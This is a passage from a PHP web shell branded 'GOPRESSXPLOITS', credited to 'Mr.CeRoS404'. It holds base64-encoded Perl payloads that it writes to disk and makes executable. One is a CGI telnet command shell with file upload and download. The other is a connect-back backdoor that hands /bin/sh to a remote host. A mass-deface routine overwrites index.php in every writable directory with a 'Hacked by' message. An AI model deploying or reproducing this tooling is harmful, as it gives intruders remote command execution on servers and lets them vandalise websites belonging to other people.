Q3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7CgkJcHJpbnQgIjxjb2RlPiRQcm9tcHQgJFJ1bkNvbW1hbmQ8L2NvZGU+PHhtcD4iOwoJCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4kUnVuQ29tbWFuZC4kUmVkaXJlY3RvcjsKCQlpZighJFdpbk5UKQoJCXsKCQkJJFNJR3snQUxSTSd9ID0gXCZDb21tYW5kVGltZW91dDsKCQkJYWxhcm0oJENvbW1hbmRUaW1lb3V0RHVyYXRpb24pOwoJCX0KCQlpZigkU2hvd0R5bmFtaWNPdXRwdXQpICMgc2hvdyBvdXRwdXQgYXMgaXQgaXMgZ2VuZXJhdGVkCgkJewoJCQkkfD0xOwoJCQkkQ29tbWFuZCAuPSAiIHwiOwoJCQlvcGVuKENvbW1hbmRPdXRwdXQsICRDb21tYW5kKTsKCQkJd2hpbGUoPENvbW1hbmRPdXRwdXQ+KQoJCQl7CgkJCQkkXyA9fiBzLyhcbnxcclxuKSQvLzsKCQkJCXByaW50ICIkX1xuIjsKCQkJfQoJCQkkfD0wOwoJCX0KCQllbHNlICMgc2hvdyBvdXRwdXQgYWZ0ZXIgY29tbWFuZCBjb21wbGV0ZXMKCQl7CgkJCXByaW50IGAkQ29tbWFuZGA7CgkJfQoJCWlmKCEkV2luTlQpCgkJewoJCQlhbGFybSgwKTsKCQl9CgkJcHJpbnQgIjwveG1wPiI7Cgl9CgkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsKCSZQcmludFBhZ2VGb290ZXI7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGRpc3BsYXlzIHRoZSBwYWdlIHRoYXQgY29udGFpbnMgYSBsaW5rIHdoaWNoIGFsbG93cyB0aGUgdXNlcgojIHRvIGRvd25sb2FkIHRoZSBzcGVjaWZpZWQgZmlsZS4gVGhlIHBhZ2UgYWxzbyBjb250YWlucyBhIGF1dG8tcmVmcmVzaAojIGZlYXR1cmUgdGhhdCBzdGFydHMgdGhlIGRvd25sb2FkIGF1dG9tYXRpY2FsbHkuCiMgQXJndW1lbnQgMTogRnVsbHkgcXVhbGlmaWVkIGZpbGVuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnREb3dubG9hZExpbmtQYWdlCnsKCWxvY2FsKCRGaWxlVXJsKSA9IEBfOwoJaWYoLWUgJEZpbGVVcmwpICMgaWYgdGhlIGZpbGUgZXhpc3RzCgl7CgkJIyBlbmNvZGUgdGhlIGZpbGUgbGluayBzbyB3ZSBjYW4gc2VuZCBpdCB0byB0aGUgYnJvd3NlcgoJCSRGaWxlVXJsID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsKCQkkRG93bmxvYWRMaW5rID0gIiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2FkJmY9JEZpbGVVcmwmbz1nbyI7CgkJJEh0bWxNZXRhSGVhZGVyID0gIjxtZXRhIEhUVFAtRVFVSVY9XCJSZWZyZXNoXCIgQ09OVEVOVD1cIjE7IFVSTD0kRG93bmxvYWRMaW5rXCI+IjsKCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7CgkJcHJpbnQgPDxFTkQ7Cjxjb2RlPgpTZW5kaW5nIEZpbGUgJFRyYW5zZmVyRmlsZS4uLjxicj4KSWYgdGhlIGRvd25sb2FkIGRvZXMgbm90IHN0YXJ0IGF1dG9tYXRpY2FsbHksCjxhIGhyZWY9IiREb3dubG9hZExpbmsiPkNsaWNrIEhlcmU8L2E+Lgo8L2NvZGU+CkVORAoJCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7Cgl9CgllbHNlICMgZmlsZSBkb2Vzbid0IGV4aXN0Cgl7CgkJJlByaW50UGFnZUhlYWRlcigiZiIpOwoJCXByaW50ICI8Y29kZT5GYWlsZWQgdG8gZG93bmxvYWQgJEZpbGVVcmw6ICQhPC9jb2RlPiI7CgkJJlByaW50RmlsZURvd25sb2FkRm9ybTsKCQkmUHJpbnRQYWdlRm9vdGVyOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiByZWFkcyB0aGUgc3BlY2lmaWVkIGZpbGUgZnJvbSB0aGUgZGlzayBhbmQgc2VuZHMgaXQgdG8gdGhlCiMgYnJvd3Nlciwgc28gdGhhdCBpdCBjYW4gYmUgZG93bmxvYWRlZCBieSB0aGUgdXNlci4KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgc2VudC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgU2VuZEZpbGVUb0Jyb3dzZXIKewoJbG9jYWwoJFNlbmRGaWxlKSA9IEBfOwoJaWYob3BlbihTRU5ERklMRSwgJFNlbmRGaWxlKSkgIyBmaWxlIG9wZW5lZCBmb3IgcmVhZGluZwoJewoJCWlmKCRXaW5OVCkKCQl7CgkJCWJpbm1vZGUoU0VOREZJTEUpOwoJCQliaW5tb2RlKFNURE9VVCk7CgkJfQoJCSRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOwoJCSgkRmlsZW5hbWUgPSAkU2VuZEZpbGUpID1+ICBtIShbXi9eXFxdKikkITsKCQlwcmludCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXVua25vd25cbiI7CgkJcHJpbnQgIkNvbnRlbnQtTGVuZ3RoOiAkRmlsZVNpemVcbiI7CgkJcHJpbnQgIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSQxXG5cbiI7CgkJcHJpbnQgd2hpbGUoPFNFTkRGSUxFPik7CgkJY2xvc2UoU0VOREZJTEUpOwoJfQoJZWxzZSAjIGZhaWxlZCB0byBvcGVuIGZpbGUKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7CgkJcHJpbnQgIjxjb2RlPkZhaWxlZCB0byBkb3dubG9hZCAkU2VuZEZpbGU6ICQhPC9jb2RlPiI7CgkJJlByaW50RmlsZURvd25sb2FkRm9ybTsKCQkmUHJpbnRQYWdlRm9vdGVyOwoJfQp9CgoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgZG93bmxvYWRzIGEgZmlsZS4gSXQgZGlzcGxheXMgYSBtZXNzYWdlCiMgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluayB0aHJvdWdoIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLgojIFRoaXMgZnVuY3Rpb24gaXMgYWxzbyBjYWxsZWQgd2hlbiB0aGUgdXNlciBjbGlja3Mgb24gdGhhdCBsaW5rLiBJbiB0aGlzIGNhc2UsCiMgdGhlIGZpbGUgaXMgcmVhZCBhbmQgc2VudCB0byB0aGUgYnJvd3Nlci4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgQmVnaW5Eb3dubG9hZAp7CgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwKCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUKCXsKCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7Cgl9CgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQoJewoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87CgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsKCX0KCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQoJewoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7Cgl9CgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQoJewoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlLiBJZiB0aGUKIyBmaWxlIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGEKIyBmaWxlLCBvdGhlcndpc2UgaXQgc3RhcnRzIHRoZSB1cGxvYWQgcHJvY2Vzcy4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgVXBsb2FkRmlsZQp7CgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgdXBsb2FkIGZvcm0gYWdhaW4KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpCgl7CgkJJlByaW50UGFnZUhlYWRlcigiZiIpOwoJCSZQcmludEZpbGVVcGxvYWRGb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7CgkJcmV0dXJuOwoJfQoJJlByaW50UGFnZUhlYWRlcigiYyIpOwoKCSMgc3RhcnQgdGhlIHVwbG9hZGluZyBwcm9jZXNzCglwcmludCAiPGNvZGU+VXBsb2FkaW5nICRUcmFuc2ZlckZpbGUgdG8gJEN1cnJlbnREaXIuLi48YnI+IjsKCgkjIGdldCB0aGUgZnVsbGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBjcmVhdGVkCgljaG9wKCRUYXJnZXROYW1lKSBpZiAoJFRhcmdldE5hbWUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsKCSRUcmFuc2ZlckZpbGUgPX4gbSEoW14vXlxcXSopJCE7CgkkVGFyZ2V0TmFtZSAuPSAkUGF0aFNlcC4kMTsKCgkkVGFyZ2V0RmlsZVNpemUgPSBsZW5ndGgoJGlueydmaWxlZGF0YSd9KTsKCSMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdAoJaWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpCgl7CgkJcHJpbnQgIkZhaWxlZDogRGVzdGluYXRpb24gZmlsZSBhbHJlYWR5IGV4aXN0cy48YnI+IjsKCX0KCWVsc2UgIyBmaWxlIGlzIG5vdCBwcmVzZW50Cgl7CgkJaWYob3BlbihVUExPQURGSUxFLCAiPiRUYXJnZXROYW1lIikpCgkJewoJCQliaW5tb2RlKFVQTE9BREZJTEUpIGlmICRXaW5OVDsKCQkJcHJpbnQgVVBMT0FERklMRSAkaW57J2ZpbGVkYXRhJ307CgkJCWNsb3NlKFVQTE9BREZJTEUpOwoJCQlwcmludCAiVHJhbnNmZXJlZCAkVGFyZ2V0RmlsZVNpemUgQnl0ZXMuPGJyPiI7CgkJCXByaW50ICJGaWxlIFBhdGg6ICRUYXJnZXROYW1lPGJyPiI7CgkJfQoJCWVsc2UKCQl7CgkJCXByaW50ICJGYWlsZWQ6ICQhPGJyPiI7CgkJfQoJfQoJcHJpbnQgIjwvY29kZT4iOwoJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkmUHJpbnRQYWdlRm9vdGVyOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUuIElmIHRoZQojIGZpbGVuYW1lIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGEKIyBmaWxlLCBvdGhlcndpc2UgaXQgZGlzcGxheXMgYSBtZXNzYWdlIHRvIHRoZSB1c2VyIGFuZCBwcm92aWRlcyBhIGxpbmsKIyB0aHJvdWdoICB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgRG93bmxvYWRGaWxlCnsKCSMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSBkb3dubG9hZCBmb3JtIGFnYWluCglpZigkVHJhbnNmZXJGaWxlIGVxICIiKQoJewoJCSZQcmludFBhZ2VIZWFkZXIoImYiKTsKCQkmUHJpbnRGaWxlRG93bmxvYWRGb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7CgkJcmV0dXJuOwoJfQoJCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwKCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUKCXsKCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7Cgl9CgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQoJewoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87CgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsKCX0KCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQoJewoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7Cgl9CgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQoJewoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgTWFpbiBQcm9ncmFtIC0gRXhlY3V0aW9uIFN0YXJ0cyBIZXJlCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KJlJlYWRQYXJzZTsKJkdldENvb2tpZXM7CgokU2NyaXB0TG9jYXRpb24gPSAkRU5WeydTQ1JJUFRfTkFNRSd9OwokU2VydmVyTmFtZSA9ICRFTlZ7J1NFUlZFUl9OQU1FJ307CiRMb2dpblBhc3N3b3JkID0gJGlueydwJ307CiRSdW5Db21tYW5kID0gJGlueydjJ307CiRUcmFuc2ZlckZpbGUgPSAkaW57J2YnfTsKJE9wdGlvbnMgPSAkaW57J28nfTsKCiRBY3Rpb24gPSAkaW57J2EnfTsKJEFjdGlvbiA9ICJsb2dpbiIgaWYoJEFjdGlvbiBlcSAiIik7ICMgbm8gYWN0aW9uIHNwZWNpZmllZCwgdXNlIGRlZmF1bHQKCiMgZ2V0IHRoZSBkaXJlY3RvcnkgaW4gd2hpY2ggdGhlIGNvbW1hbmRzIHdpbGwgYmUgZXhlY3V0ZWQKJEN1cnJlbnREaXIgPSAkaW57J2QnfTsKY2hvcCgkQ3VycmVudERpciA9IGAkQ21kUHdkYCkgaWYoJEN1cnJlbnREaXIgZXEgIiIpOwoKJExvZ2dlZEluID0gJENvb2tpZXN7J1NBVkVEUFdEJ30gZXEgJFBhc3N3b3JkOwoKaWYoJEFjdGlvbiBlcSAibG9naW4iIHx8ICEkTG9nZ2VkSW4pICMgdXNlciBuZWVkcy9oYXMgdG8gbG9naW4KewoJJlBlcmZvcm1Mb2dpbjsKfQplbHNpZigkQWN0aW9uIGVxICJjb21tYW5kIikgIyB1c2VyIHdhbnRzIHRvIHJ1biBhIGNvbW1hbmQKewoJJkV4ZWN1dGVDb21tYW5kOwp9CmVsc2lmKCRBY3Rpb24gZXEgInVwbG9hZCIpICMgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlCnsKCSZVcGxvYWRGaWxlOwp9CmVsc2lmKCRBY3Rpb24gZXEgImRvd25sb2FkIikgIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQp7CgkmRG93bmxvYWRGaWxlOwp9CmVsc2lmKCRBY3Rpb24gZXEgImxvZ291dCIpICMgdXNlciB3YW50cyB0byBsb2dvdXQKewoJJlBlcmZvcm1Mb2dvdXQ7Cn0K';

$file = fopen("izo.cin" ,"w+");
$write = fwrite ($file ,base64_decode($cgishellizocin));
fclose($file);
    chmod("izo.cin",0755);
$netcatshell = 'IyEvdXNyL2Jpbi9wZXJsDQogICAgICB1c2UgU29ja2V0Ow0KICAgICAgcHJpbnQgIkRhdGEgQ2hh
MHMgQ29ubmVjdCBCYWNrIEJhY2tkb29yXG5cbiI7DQogICAgICBpZiAoISRBUkdWWzBdKSB7DQog
ICAgICAgIHByaW50ZiAiVXNhZ2U6ICQwIFtIb3N0XSA8UG9ydD5cbiI7DQogICAgICAgIGV4aXQo
MSk7DQogICAgICB9DQogICAgICBwcmludCAiWypdIER1bXBpbmcgQXJndW1lbnRzXG4iOw0KICAg
ICAgJGhvc3QgPSAkQVJHVlswXTsNCiAgICAgICRwb3J0ID0gODA7DQogICAgICBpZiAoJEFSR1Zb
MV0pIHsNCiAgICAgICAgJHBvcnQgPSAkQVJHVlsxXTsNCiAgICAgIH0NCiAgICAgIHByaW50ICJb
Kl0gQ29ubmVjdGluZy4uLlxuIjsNCiAgICAgICRwcm90byA9IGdldHByb3RvYnluYW1lKCd0Y3An
KSB8fCBkaWUoIlVua25vd24gUHJvdG9jb2xcbiIpOw0KICAgICAgc29ja2V0KFNFUlZFUiwgUEZf
SU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllICgiU29ja2V0IEVycm9yXG4iKTsNCiAg
ICAgIG15ICR0YXJnZXQgPSBpbmV0X2F0b24oJGhvc3QpOw0KICAgICAgaWYgKCFjb25uZWN0KFNF
UlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsICR0YXJnZXQpKSB7DQogICAgICAgIGRpZSgi
VW5hYmxlIHRvIENvbm5lY3RcbiIpOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBTcGF3bmlu
ZyBTaGVsbFxuIjsNCiAgICAgIGlmICghZm9yayggKSkgew0KICAgICAgICBvcGVuKFNURElOLCI+
JlNFUlZFUiIpOw0KICAgICAgICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgICAgICAgb3Bl
bihTVERFUlIsIj4mU0VSVkVSIik7DQogICAgICAgIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAu
ICJcMCIgeCA0Ow0KICAgICAgICBleGl0KDApOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBE
YXRhY2hlZFxuXG4iOw==';

$file = fopen("dc.pl" ,"w+");
$write = fwrite ($file ,base64_decode($netcatshell));
fclose($file);
    chmod("dc.pl",0755);
   echo "<iframe src=cgitelnet1/izo.cin width=96% height=90% frameborder=0></iframe> 

 
 </div>"; }
elseif($_GET['opt'] == 'mass_deface') {
	function sabun_massal($path,$namafile,$isi_script) {
		if(is_writable($path)) {
			$dira = scandir($path);
			foreach($dira as $dirb) {
				$dirc = "$path/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($path,$namafile,$isi_script) {
		if(is_writable($path)) {
			$dira = scandir($path);
			foreach($dira as $dirb) {
				$dirc = "$path/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "http://$dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	}else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tipe Sabun:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$path' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked by Mr.CeRoS404</textarea><br>
	<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
	</form></center>";
	}
}
echo '</table>';
echo'</div>';
}

echo '<br /><font color="#00FFFF">GOPRESSXPLOITS<font color="#E0FFFF"></font><a href="" target="_blank"> r3c0ded bY <font color="#8A2BE2">Mr.CeRoS404 </a> <a href="" target="_blank"><font color="#FF69B4"></a></font>
</BODY>
</HTML>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}

?>


<!-- --------Cursor--------- -->
<style type='text/css'>body, a, a:link{cursor:url(http://4.bp.blogspot.com/-hAF7tPUnmEE/TwGR3lRH0EI/AAAAAAAAAs8/6pki22hc3NE/s1600/ass.png), default;} a:hover {cursor:url(http://3.bp.blogspot.com/-bRikgqeZx0Q/TwGR4MUEC7I/AAAAAAAAAtA/isJmS0r35Qw/s1600/pointer.png),wait;}</style>





 <body background="https://cn.pling.com/img//hive/content-pre1/85401-1.png">
